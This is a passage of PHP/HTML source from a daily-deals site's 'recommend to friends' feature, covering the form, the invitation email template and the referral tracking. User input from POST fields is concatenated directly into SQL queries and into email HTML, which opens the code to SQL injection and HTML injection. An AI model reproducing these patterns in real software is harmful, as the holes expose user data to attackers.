<div style="display: none;">
		<div id="inline1" style="width:701px;height:px;overflow:auto; background-color: transparent;">
			<?php //if (isset($_SESSION['user_id'])) { ?>
				<div class="deal_recomm">
				<div class="top_recomm">
				<p>Recommend now to your friends</p>
				</div>
				<div class="clear"></div>
				<div style="border-bottom: 3px solid #7fd7fb;"></div>
				<div class="clear"></div>
				<div class="recomm_mid">

		<?php
				if (isset($_POST['RecomendSubmit']) && $_POST['RecomendSubmit'] == "Tell them") {

				$recom_deal_id = $_POST['recomdealid'];

				$sql_email_recom = "SELECT * FROM ".TABLE_DEALS." WHERE deal_id = ".$recom_deal_id." LIMIT 0, 1"; //AND deal_end_time LIKE '".date("Y-m-d")."%' LIMIT 0, 4";
				$email_res_recom = mysql_fetch_array(mysql_query($sql_email_recom));
				$sql_email_image_recom = mysql_fetch_array(mysql_query("SELECT * FROM ".TABLE_DEAL_IMAGES." WHERE deal_id = ".$email_res_recom['deal_id']));
				//'.UPLOAD_PATH.$email_image_1['file'].'

				//echo '<img src="UPLOAD_PATH.$email_image_1[file]">';

					$user_id = $_SESSION['fb_id'];
					$sql_select = "SELECT * FROM ".TABLE_FB_USER." WHERE fb_id= $user_id";
					$result_select = mysql_fetch_array(mysql_query($sql_select));
					$user_name = $result_select['name'];

					$recom_email_save = $email_res_recom['savings'];
					$recom_email_disc = $email_res_recom['discount'];

					//$recom_email_save = strip_tags(($email_res_recom['full_price'])*($email_res_recom['discounted_price'])/100);
					//$recom_email_disc = number_format($email_res_recom['discounted_price'],2);

					$template_recom = '
							<table border="0" cellspacing="0" cellpadding="0" width="620" style="vertical-align:top; width:620px; margin:0 auto;">
                           <tr>
							<td height="16" style="height:16px; line-height:16px; color:#4f4437; font-family:Arial, Helvetica, sans-serif; line-height:26px; font-size:12px; font-weight: normal; text-align: center; vertical-align: middle;">
							Add "rewards@Jumblr.com" to your address book to ensure you get emails from Jumblr.
							</td>
						  </tr>
						  <tr>
							<td height="10" style="height:10px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/box1_top.png" width="620" height="10" alt="" /></td>
						  </tr>
						   <tr>
							<td valign="top" align="left" background="'.SITE_URL.'images/reg_newsletter/bg_p.gif">
							 <table width="100%" border="0" cellspacing="0" cellpadding="0">
							  <tr>
								<td valign="top" align="left">
									<table border="0" cellspacing="0" cellpadding="0" width="620" style="vertical-align:top; width:620px;">
								  <tr>
									<td width="10" valign="top" style="vertical-align:top; width:10px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" width="10" height="1" alt="" /></td>
									<td width="171" height="76" align="left" valign="top" style="vertical-align:top; text-align:left; width:171px; height:76px; line-height:0px;">
										<img src="'.SITE_URL.'images/reg_newsletter/logo.png" width="164" height="72" alt="" />
									</td>
									<td width="350" valign="top" style="vertical-align:top; width:350px; color:#fff; font-family:Arial, Helvetica, sans-serif; line-height:26px; font-size:25px; font-weight:bold; padding:12px 10px 0 6px;">'.$user_name.' has invited you to join Jumblr</td>
								  </tr>
							  </table>
								</td>
							  </tr>
							  <tr>
								 <td height="15" valign="top" style="vertical-align:top; height:15px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" width="1" height="15" alt="" /></td>
							 </tr>
							  <tr>
								 <td height="15" valign="top" style="vertical-align:top; height:15px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/box2_top.png" width="620" height="15" alt="" /></td>
							 </tr>
							  <tr>
								<td valign="top" background="'.SITE_URL.'images/reg_newsletter/box2_middle.png" style="padding:0 25px;">
									<table width="570" border="0" cellspacing="0" cellpadding="0" style="width:570px; margin: 0 auto;">
									  <tr>
										<td valign="top">
										 <table width="100%" border="0" cellspacing="0" cellpadding="0">
										  <tr>
											<td valign="top" style="color:#14131b; font-family:Arial, Helvetica, sans-serif; line-height:26px; font-size:15px; font-weight:normal; padding:0 0 0 6px;"><strong>'. $_POST['fmsg'] .'</strong></td>
										  </tr>
										  <tr>
											<td valign="top" style="color:#14131b; font-family:Arial, Helvetica, sans-serif; line-height:26px; font-size:15px; font-weight:normal; padding:0 0 0 6px;"> You can learn more about Jumblr in the <a href="'. SITE_URL .'faq.php" style="color:#009CE8;">FAQ section.</a></td>
										  </tr>
										  <tr>
										  <td style="color:#4f4437; font-family:Arial, Helvetica, sans-serif; line-height:17px; font-size:11px; font-weight:normal; padding:8px 0 0 6px;">If you purchase this deal within 48 hours of opening a Jumblr account, '.getSettings(currency_symbol).'5 will automatically be credited to your friend\'s Jumblr account, so you can both enjoy great saving! You will hear nothing else from us as a result of this referral. You have not been added to any database and there is no need to ask for removal. <br/>See our <a href="'.SITE_URL.'page.php?page=Privacy Policy" style="font-size: 12px; text-decoration: underline; color:#4f4437;">Privacy Policy</a>.</td>
										  </tr>
										  <tr>
											  <td height="8"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="8" /></td>
										  </tr>
										  <tr>
											<td background="'.SITE_URL.'images/reg_newsletter/box_bg.gif" height="198" valign="top">
											 <table width="100%" border="0" cellspacing="0" cellpadding="0">
											 <tr>
												<td colspan="5" style="color:#14131b; font-family:Arial, Helvetica, sans-serif; line-height:17px; font-size:24px; font-weight:bold; padding:10px 0 20px 0; text-align:center;">What can Jumblr do for you?</td>
											 </tr>
											 <tr>
											 <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
											  <tr>
												 <td height="4" colspan="4" style="line-height:0px; height:4px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="4" /></td>
												 </tr>
											   <tr>
												 <td width="3%">&nbsp;</td>
												 <td width="6%"><img src="'.SITE_URL.'images/reg_newsletter/right_mark.jpg" alt="" width="20" height="19" /></td>
												 <td style="font-family:Arial, Helvetica, sans-serif; color:#333333; font-size:14px;"><span style="font-size:20px; font-weight: bold;">It\'s great value</span> - you can save up to 90% every purchase make</td>
												 <td width="4%">&nbsp;</td>
											   </tr>
											   <tr>
												 <td height="4" colspan="4" style="line-height:0px; height:4px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="4" /></td>
												 </tr>
											   <tr>
												 <td width="3%">&nbsp;</td>
												 <td width="6%"><img src="'.SITE_URL.'images/reg_newsletter/right_mark.jpg" alt="" width="20" height="19" /></td>
												 <td style="font-family:Arial, Helvetica, sans-serif; color:#333333; font-size:14px;"><span style="font-size:20px; font-weight: bold;">It\'s fun</span> - invite friends to the deal and earn money in return</td>
												 <td width="4%">&nbsp;</td>
											   </tr>
											   <tr>
												 <td height="4" colspan="4" style="line-height:0px; height:4px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="4" /></td>
												 </tr>
											   <tr>
												 <td width="3%">&nbsp;</td>
												 <td width="6%"><img src="'.SITE_URL.'images/reg_newsletter/right_mark.jpg" alt="" width="20" height="19" /></td>
												 <td style="font-family:Arial, Helvetica, sans-serif; color:#333333; font-size:14px;"><span style="font-size:20px; font-weight: bold;">It\'s up-to-date</span> - exciting and fun deals featured every day just for you</td>
												 <td width="4%">&nbsp;</td>
											   </tr>
											   <tr>
												 <td height="4" colspan="4" style="line-height:0px; height:4px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="4" /></td>
												 </tr>
											   <tr>
												 <td width="3%">&nbsp;</td>
												 <td width="6%"><img src="'.SITE_URL.'images/reg_newsletter/right_mark.jpg" alt="" width="20" height="19" /></td>
												 <td style="font-family:Arial, Helvetica, sans-serif; color:#333333; font-size:14px;"><span style="font-size:20px; font-weight: bold;">It\'s nationwide</span> - we operate in most cities in uk</td>
												 <td width="4%">&nbsp;</td>
											   </tr>
											 </table></td>
											 </tr>

											</table>
										   </td>
										  </tr>
										  <tr>
											<td valign="top" style="color:#14131b; font-family:Arial, Helvetica, sans-serif; line-height:26px; font-size:25px; font-weight:bold; padding:10px 0 10px 6px;"><span style="color:#5b8f32;">Todays deal :</span> '. $email_res_recom[title] .'</td>
										  </tr>
										  <tr>
											<td>

											 <table width="100%" border="0" cellspacing="0" cellpadding="0">
											  <tr>
												<td width="10" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="10" height="1" /></td>
												<td width="230" height="226" style="height:226px; background-repeat: no-repeat;" valign="top" background="'.SITE_URL.'images/reg_newsletter/p_bg.jpg">
						<table width="100%" border="0" cellspacing="0" cellpadding="0">
<tr>
                            <td height="10"><img src="'.SITE_URL.'images/spacer.gif" alt="" width="1" height="10" /></td>
                          </tr>
                          <tr>
                            <td valign="top" align="center" style="padding:0 0 0 15px; color:#000; font-family:Arial, Helvetica, sans-serif; font-size:24px; font-weight:bold; text-align:center;">For '. getSettings(currency_symbol). $email_res_recom['discounted_price'].'</td>
                          </tr>
<tr>
                            <td height="10"><img src="'.SITE_URL.'images/spacer.gif" alt="" width="1" height="10" /></td>
                          </tr>

                          <tr>
                            <td height="55" valign="top" align="center" style="padding:0 0 0 15px; height:55px; color:#000; font-family:Arial, Helvetica, sans-serif; font-size:24px; font-weight:bold; text-align:center;"><a href="'.SITE_URL.'index.php?action=view&id='. $email_res_recom[deal_id] .'" style="color:#fff;">View Now !</a></td>
                          </tr>

                              <tr>
                               <td height="20" style="line-height:0px; height:20px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="20" /></td>
                              </tr>

                              <tr>
                                <td valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">
                                  <tr>
                                    <td width="27">&nbsp;</td>
                                    <td style="font-family:Arial, Helvetica, sans-serif; font-size:11px; font-weight:bold; text-align:center;" width="99" align="center" valign="middle">Discount '.$recom_email_disc.'%</td>
                                    <td style="font-family:Arial, Helvetica, sans-serif; font-size:11px; font-weight:bold; text-align:center;" width="44%" align="center" valign="middle">Saving '.getSettings(currency_symbol).$recom_email_save.'</td>
                                  </tr>
                                </table></td>
                              </tr>
<tr>
                               <td height="30" style="line-height:0px; height:30px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="30" /></td>
                              </tr>
                              <tr>
                                <td valign="top"><table width="100%" border="0" cellspacing="0" cellpadding="0">

                                  <tr>
                                    <td width="12%">&nbsp;</td>
                                    <td style="font-family: Arial, Helvetica, sans-serif; font-size: 12px; color:#333333; text-align:center" width="88%">This deal is available until
'.date("d.m.Y H:i",strtotime($email_res_recom[deal_end_time])).'</td>
                                  </tr>
                                </table></td>
                              </tr>
                         </table>
				   </td>
												<td width="30" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="30" height="1" /></td>
												<td width="290" valign="top"><img src="'.UPLOAD_PATH.$sql_email_image_recom[file].'" alt="" width="288" height="224" /></td>
												<td width="10" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="10" height="1" /></td>
											  </tr>
											</table>                    </td>
										  </tr>
										 </table>
										</td>
									  </tr>
										<tr>
										 <td valign="top" height="12"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="5" height="12" /></td>
									   </tr>
									  <tr>
										 <td style="text-align:center; padding: 0 0 0 228px;">
											<table border="0" align="left" cellpadding="0" cellspacing="0">
											  <tr>
												<td valign="top" width="10"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="10" height="1" /></td>
												<td width="65" style="color:#000; font-family:Arial, Helvetica, sans-serif; line-height:16px; font-size:12px; font-weight:bold;">Follow Us:</td>
												<td valign="top" width="10"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="2" height="1" /></td>
												<td width="25" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/icon_01.png" alt="" /></td>
												<td width="9" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="2" height="1" /></td>
												<td width="25" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/icon_02.png" alt="" /></td>
											  </tr>
										   </table>
										</td>
										</tr>
										 <tr>
											 <td valign="top" height="6"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="6" /></td>
										</tr>
										<tr>
										 <td valign="top" height="1" style="height:1px; line-height:0px; border-top:1px solid #7ed7fc;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="1" /></td>
									   </tr>
										<tr>
											 <td valign="top" height="6" style="height:6px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="6" /></td>
										   </tr>
										<tr>
											<td valign="top" align="center">
											<a href="'.SITE_URL.'" style="padding:0 4px; color:#5b6cd9; font-family:Arial, Helvetica, sans-serif; line-height:18px; font-size:14px;text-align:center; text-decoration:none;">&copy; Jumblr.com</a>
											<a href="'.SITE_URL.'page.php?page=Terms and Conditions" style="padding:0 4px; color:#5b6cd9; font-family:Arial, Helvetica, sans-serif; line-height:18px; font-size:14px;text-align:center; text-decoration:none;">Terms & Conditions</a>
											<a href="'.SITE_URL.'customer-register.php" style="padding:0 4px; color:#5b6cd9; font-family:Arial, Helvetica, sans-serif; line-height:18px; font-size:14px;text-align:center; text-decoration:none;">Join Us</a>
											<a href="'.SITE_URL.'page.php?page=About Jumblr UK" style="padding:0 4px; color:#5b6cd9; font-family:Arial, Helvetica, sans-serif; line-height:18px; font-size:14px;text-align:center; text-decoration:none;">About Jumblr</a>
											<a href="'.SITE_URL.'merchant_business.php" style="padding:0 4px; color:#5b6cd9; font-family:Arial, Helvetica, sans-serif; line-height:18px; font-size:14px;text-align:center; text-decoration:none;">Run Deal With Us</a>                   </td>
										 </tr>
									 </table>
								  </td>
								  </tr>
								 <tr>
								 <td height="15" valign="top" style="vertical-align:top; height:15px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/box2_bottom.png" width="620" height="15" alt="" /></td>
							 </tr>
							</table>
							</td>
						   </tr>
						   <tr>
							<td height="10" style="height:10px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/box1_bottom.png"" width="620" height="10" alt="" /></td>
						  </tr>
						</table>



					';

					/* Old email template
					 *
					 * <table border="0" cellspacing="0" cellpadding="0" width="620" style="vertical-align:top; width:620px; margin:0 auto;">
                           <tr>
							<td height="16" style="height:16px; line-height:16px; color:#4f4437; font-family:Arial, Helvetica, sans-serif; line-height:26px; font-size:12px; font-weight: normal; text-align: center; vertical-align: middle;">
							Add "rewards@Jumblr.com" to your address book to ensure you get emails from Jumblr.
							</td>
						  </tr>
						  <tr>
							<td height="10" style="height:10px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/box1_top.png" width="620" height="10" alt="" /></td>
						  </tr>
						   <tr>
							<td valign="top" align="left" background="'.SITE_URL.'images/reg_newsletter/bg_p.gif">
							 <table width="100%" border="0" cellspacing="0" cellpadding="0">
							  <tr>
								<td valign="top" align="left">
									<table border="0" cellspacing="0" cellpadding="0" width="620" style="vertical-align:top; width:620px;">
								  <tr>
									<td width="10" valign="top" style="vertical-align:top; width:10px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" width="10" height="1" alt="" /></td>
									<td width="171" height="76" align="left" valign="top" style="vertical-align:top; text-align:left; width:171px; height:76px; line-height:0px;">
										<img src="'.SITE_URL.'images/reg_newsletter/logo.png" width="164" height="72" alt="" />
									</td>
									<td width="350" valign="top" style="vertical-align:top; width:350px; color:#fff; font-family:Arial, Helvetica, sans-serif; line-height:26px; font-size:25px; font-weight:bold; padding:12px 10px 0 6px;">'.$user_name.' has invited you to join Jumblr</td>
								  </tr>
							  </table>
								</td>
							  </tr>
							  <tr>
								 <td height="15" valign="top" style="vertical-align:top; height:15px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" width="1" height="15" alt="" /></td>
							 </tr>
							  <tr>
								 <td height="15" valign="top" style="vertical-align:top; height:15px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/box2_top.png" width="620" height="15" alt="" /></td>
							 </tr>
							  <tr>
								<td valign="top" background="'.SITE_URL.'images/reg_newsletter/box2_middle.png" style="padding:0 25px;">
									<table width="570" border="0" cellspacing="0" cellpadding="0" style="width:570px; margin: 0 auto;">
									  <tr>
										<td valign="top">
										 <table width="100%" border="0" cellspacing="0" cellpadding="0">
										  <tr>
											<td valign="top" style="color:#14131b; font-family:Arial, Helvetica, sans-serif; line-height:26px; font-size:15px; font-weight:normal; padding:0 0 0 6px;">'. $_POST['fmsg'] .'</td>
										  </tr>
										  <tr>
											<td valign="top" style="color:#14131b; font-family:Arial, Helvetica, sans-serif; line-height:26px; font-size:15px; font-weight:normal; padding:0 0 0 6px;"> You can learn more about Jumblr in the <a href="'. SITE_URL .'faq.php" style="color:#009CE8;">FAQ section.</a></td>
										  </tr>
										  <tr>
										  <td style="color:#4f4437; font-family:Arial, Helvetica, sans-serif; line-height:17px; font-size:11px; font-weight:normal; padding:8px 0 0 6px;">If you purchase this deal within 48 hours of opening a Jumblr account, &pound;5 will automatically be credited to your friend\'s Jumblr account, so you can both enjoy great saving! You will hear nothing else from us as a result of this referral. You have not been added to any database and there is no need to ask for removal. <br/>See our <a href="'.SITE_URL.'page.php?page=Privacy Policy" style="font-size: 12px; text-decoration: underline; color:#4f4437;">Privacy Policy</a>.</td>
										  </tr>
										  <tr>
											  <td height="8"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="8" /></td>
										  </tr>
										  <tr>
											<td background="'.SITE_URL.'images/reg_newsletter/box_bg.gif" height="198" valign="top">
											 <table width="100%" border="0" cellspacing="0" cellpadding="0">
											 <tr>
												<td colspan="5" style="color:#14131b; font-family:Times New Roman, Times, serif; line-height:17px; font-size:24px; font-weight:bold; padding:10px 0 20px 0; text-align:center;">What can Jumblr do for you?</td>
											 </tr>
											  <tr>
												<td width="10" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="10" height="1" /></td>
												<td width="265" valign="top">
												 <table width="100%" border="0" cellspacing="0" cellpadding="0">
												  <tr>
													<td valign="top" style="color:#14131b; font-family: Times New Roman, Times, serif; line-height:17px; font-size:14px; font-weight:normal; padding:10px 0 10px 0;"> <b style="font-size:20px; font-family:Times New Roman, Times, serif; font-weight:bold;">It\'s great value </b>- you can save up to 90%</td>
												  </tr>
												   <tr>
													<td valign="top" style="color:#14131b; font-family: Times New Roman, Times, serif; line-height:17px; font-size:14px; font-weight:normal; padding:10px 0 10px 0;"> <b style="font-size:20px; font-family:Times New Roman, Times, serif; font-weight:bold;">It\'s up-to-date </b>- theres new deal everyday</td>
												  </tr>
												 </table>
												 </td>
												<td width="20" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="30" height="1" /></td>
												<td width="265" valign="top">
												 <table width="100%" border="0" cellspacing="0" cellpadding="0">
												  <tr>
													<td valign="top" style="color:#14131b; font-family:Arial, Helvetica, sans-serif; line-height:17px; font-size:14px; font-weight:normal; padding:10px 0 10px 0;"> <b style="font-size:20px; font-family:Times New Roman, Times, serif; font-weight:bold;">It\'s fun </b>- invite friends to the deal and earn cash in return</td>
												  </tr>
												   <tr>
													<td valign="top" style="color:#14131b; font-family:Arial, Helvetica, sans-serif; line-height:17px; font-size:14px; font-weight:normal; padding:10px 0 10px 0;"> <b style="font-size:20px; font-family:Times New Roman, Times, serif; font-weight:bold;">It\'s nationwide </b>- we operate in most cities of the UK and we are growing fast</td>
												  </tr>
												 </table>
												</td>
												<td width="10" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="10" height="1" /></td>
											  </tr>
											</table>                    </td>
										  </tr>
										  <tr>
											<td valign="top" style="color:#14131b; font-family:Arial, Helvetica, sans-serif; line-height:26px; font-size:25px; font-weight:bold; padding:10px 0 10px 6px;"><span style="color:#5b8f32;">Todays deal :</span> '. $email_res_recom[title] .'</td>
										  </tr>
										  <tr>
											<td>
											 <table width="100%" border="0" cellspacing="0" cellpadding="0">
											  <tr>
												<td width="10" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="10" height="1" /></td>
												<td width="230" valign="top">
												 <table width="100%" border="0" cellspacing="0" cellpadding="0">
												  <tr>
													<td><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="12" /></td>
												  </tr>
												  <tr>
													<td height="90" valign="top" background="'.SITE_URL.'images/reg_newsletter/price_bg.png">
														<table width="100%" border="0" cellspacing="0" cellpadding="0">
														  <tr>
															<td valign="top" align="center" style="padding:8px 0 10px 15px; color:#00cb46; font-family:Arial, Helvetica, sans-serif; line-height:24px; font-size:24px; font-weight:bold; text-align:center;">&pound;'. $email_res_recom[discounted_price] .'</td>
														  </tr>
														  <tr>
															<td valign="top" align="center" style="padding:8px 0 10px 15px; color:#fff; font-family:Arial, Helvetica, sans-serif; line-height:24px; font-size:24px; font-weight:bold; text-align:center;"><a href="'.SITE_URL.'?action=view&id='.$email_res_recom[deal_id].'" style="color:#fff;">View Now !</a></td>
														  </tr>
														</table>                                </td>
													  </tr>
													  <tr>
														<td height="5"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="5" /></td>
													  </tr>
													  <tr>
														<td valign="top" height="67" background="'.SITE_URL.'images/reg_newsletter/timer_bg.png">
														<table style="padding: 0 0 0 10px" width="100%" border="0" cellspacing="0" cellpadding="0">
														  <tr>
															<td valign="top" align="center" width="66" style="padding:8px 0 5px 0; color:#000; font-family:Arial, Helvetica, sans-serif; line-height:24px; font-size:12px; font-weight:bold; text-align:center;">Value</td>
															<td valign="top" align="center" width="75" style="padding:8px 0 5px 2px; color:#000; font-family:Arial, Helvetica, sans-serif; line-height:24px; font-size:12px; font-weight:bold; text-align:center;">Discount</td>
															<td valign="top" align="center" width="78" style="padding:8px 4px 5px 0; color:#000; font-family:Arial, Helvetica, sans-serif; line-height:24px; font-size:12px; font-weight:bold; text-align:center;">Your Save</td>
														  </tr>
														  <tr>
															<td valign="top" align="center" width="66" style="padding:0 0 0 0; color:#000; font-family:Arial, Helvetica, sans-serif; line-height:16px; font-size:16px; font-weight:bold; text-align:center;">&pound;'.$email_res_recom[full_price].'</td>
															<td valign="top" align="center" style="padding:0 0 0 2px; color:#000; font-family:Arial, Helvetica, sans-serif; line-height:16px; font-size:16px; font-weight:bold; text-align:center;">'.$recom_email_disc.'%</td>
															<td valign="top" align="center" style="padding:0 4px 0 0; color:#000; font-family:Arial, Helvetica, sans-serif; line-height:16px; font-size:16px; font-weight:bold; text-align:center;">&pound;'.$recom_email_save.'</td>
													  </tr>
													</table>
												   </td>
												  </tr>
												  <tr>
													  <td height="5"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="5" /></td>
												  </tr>
												  <tr>
													  <td bgcolor="#fff8d9" style="border:1px solid #d8d7d3; padding:8px 4px 8px 0; color:#000; font-family:Arial, Helvetica, sans-serif; line-height:16px; font-size:13px; font-weight:bold; text-align:center;">This deal is available until <br />'.date("d.m.Y H:i",strtotime($email_res_recom[deal_end_time])).'</td>
												  </tr>
												 </table>
												 </td>
												<td width="30" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="30" height="1" /></td>
												<td width="290" valign="top"><img src="'.UPLOAD_PATH.$sql_email_image_recom[file].'" alt="" width="288" height="224" /></td>
												<td width="10" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="10" height="1" /></td>
											  </tr>
											</table>                    </td>
										  </tr>
										 </table>
										</td>
									  </tr>
										<tr>
										 <td valign="top" height="12"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="5" height="12" /></td>
									   </tr>
									  <tr>
										 <td>
											<table width="125" border="0" align="left" cellpadding="0" cellspacing="0">
											  <tr>
												<td valign="top" width="10"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="10" height="1" /></td>
												<td width="150" style="color:#000; font-family:Arial, Helvetica, sans-serif; line-height:16px; font-size:12px; font-weight:bold;">Follow Us:</td>
												<td valign="top" width="10"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="2" height="1" /></td>
												<td width="25" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/icon_01.png" alt="" /></td>
												<td width="9" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="2" height="1" /></td>
												<td width="25" valign="top"><img src="'.SITE_URL.'images/reg_newsletter/icon_02.png" alt="" /></td>
											  </tr>
										   </table>
										</td>
										</tr>
										 <tr>
											 <td valign="top" height="6"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="6" /></td>
										</tr>
										<tr>
										 <td valign="top" height="1" style="height:1px; line-height:0px; border-top:1px solid #7ed7fc;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="1" /></td>
									   </tr>
										<tr>
											 <td valign="top" height="6" style="height:6px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/spacer.gif" alt="" width="1" height="6" /></td>
										   </tr>
										<tr>
											<td valign="top" align="center">
											<a href="'.SITE_URL.'" style="padding:0 4px; color:#5b6cd9; font-family:Arial, Helvetica, sans-serif; line-height:18px; font-size:14px;text-align:center; text-decoration:none;">&copy; Jumblr.com</a>
											<a href="'.SITE_URL.'page.php?page=Terms and Conditions" style="padding:0 4px; color:#5b6cd9; font-family:Arial, Helvetica, sans-serif; line-height:18px; font-size:14px;text-align:center; text-decoration:none;">Terms & Conditions</a>
											<a href="'.SITE_URL.'customer-register.php" style="padding:0 4px; color:#5b6cd9; font-family:Arial, Helvetica, sans-serif; line-height:18px; font-size:14px;text-align:center; text-decoration:none;">Join Us</a>
											<a href="'.SITE_URL.'page.php?page=About Jumblr UK" style="padding:0 4px; color:#5b6cd9; font-family:Arial, Helvetica, sans-serif; line-height:18px; font-size:14px;text-align:center; text-decoration:none;">About Jumblr</a>
											<a href="'.SITE_URL.'merchant_business.php" style="padding:0 4px; color:#5b6cd9; font-family:Arial, Helvetica, sans-serif; line-height:18px; font-size:14px;text-align:center; text-decoration:none;">Run Deal With Us</a>                   </td>
										 </tr>
									 </table>
								  </td>
								  </tr>
								 <tr>
								 <td height="15" valign="top" style="vertical-align:top; height:15px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/box2_bottom.png" width="620" height="15" alt="" /></td>
							 </tr>
							</table>
							</td>
						   </tr>
						   <tr>
							<td height="10" style="height:10px; line-height:0px;"><img src="'.SITE_URL.'images/reg_newsletter/box1_bottom.png"" width="620" height="10" alt="" /></td>
						  </tr>
						</table>
					 *
					 */


					// Recomendation tracker code for calculating Credits
					$r_emails = explode(',',$_POST['femail']);
					$today = date("Y-m-d");
					//var_dump($r_emails); r_id 	r_email 	r_user 	r_date
					foreach ($r_emails as $r_email) {
						$r_email = trim($r_email);
						$recom_tracker_sql = "INSERT INTO getdeals_recom_tracker VALUES ('','$r_email','$_SESSION[user_id]','$today')";
						mysql_query($recom_tracker_sql);
					}


					//$fmsg = $_POST['fmsg'];
					//$headers  = 'MIME-Version: 1.0' . "\r\n";
					$headers = 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
					$headers .= "From: Jumblr Referral<rewards@Jumblr.com>";
					$femail = $_POST['femail'];
					$sub = ucwords($user_name)." has invited you to join Jumblr";


					//@mail($femail, $sub, $template_recom, $headers);
					header('location: '.SITE_URL);
					exit();
				}

			?>
<?php

	if ($_GET['nd'] == "National deals") {
	$sql_today = "SELECT * FROM ".TABLE_DEALS." WHERE status >= 1 AND best_deal = 'y' AND deal_end_time >= NOW() LIMIT 0, 1";
	$today_res = mysql_fetch_array(mysql_query($sql_today));
	$no_of_deal = mysql_num_rows(mysql_query($sql_today));

	$sql_todays_image = "SELECT * FROM ".TABLE_DEAL_IMAGES." WHERE deal_id = ".$today_res['deal_id'];
	$todays_image = mysql_fetch_array(mysql_query($sql_todays_image));
	}
	//echo $_SESSION['current_deal_id'];
	if ($_GET['id']) {
		$curent_recom_deal_id = $_GET['id'];
	}else{
		$curent_recom_deal_id = $_SESSION['current_deal_id'];
	}



	//echo $curent_recom_deal_id.'+++++++++'.$today_res['deal_id'];
?>


		<form action="" name="" method="post" onsubmit="return validateRecom();">
		<input type="hidden" name="recomdealid" id="recomdealid" value="<?php if ($_GET['nd'] == "National deals") { echo $today_res['deal_id']; } else { echo $curent_recom_deal_id;} ; ?>">
				<div class="invita_deal">
				<div><p>Your invitation message:</p><div class="error_orange10" id="msgErr"></div></div>
				<div class="clear"></div>

				<div class="massage">

				<div class="massage_left">
				<textarea name="fmsg" id="fmsg" class="textarea2">
Hi,
I would like to recommend this deal.
Take care!
Your friend.</textarea></div>
				<div class="massage_right">
				<div><img src="images/dollar.jpg" alt="" width="168" height="108" /></div>
				<div>
				<!-- <ul>
				<li style="float:left; width: 16px; margin: 0 auto;"><a href="javascript: showDetails(10)" onmouseover="return overlib('&lt;font class=bodytext&gt;<div class=tiptool style=z-index:510><div class=tip_top></div><div class=clear></div><div class=arrowright1></div><div class=tip_mid><h2>How does it work?</h2><ul><li>You receive &pound;5.00 credit for every friend who buys a deal via your link within 48 hours of opening a Jumblr account. You can buy and enjoy even greater savings! You\'ll find an overview of your successful recommendations at Credits after you log in.</li></ul></div><div class=tip_bot></div></div>&lt;/font&gt;',BORDER,'1');" onMouseOut="nd();"><img src="images/question.png" width="12" height="12" vspace="4" align="default" ></a></li>
				<li style="float: right; width: 162px; margin: 0 auto;">You'll be credited &pound;5 on every successfull recommendation</li>
				</ul> -->
				</div>
				</div>
				</div>
				</div>
				<div class="clear"><img src="images/spacer.gif" alt="" width="1" height="10" /></div>
				<div style="border-bottom: 3px solid #7fd7fb;"></div>
				<div class="clear"></div>
				<div class="invita_deal">
				<div>
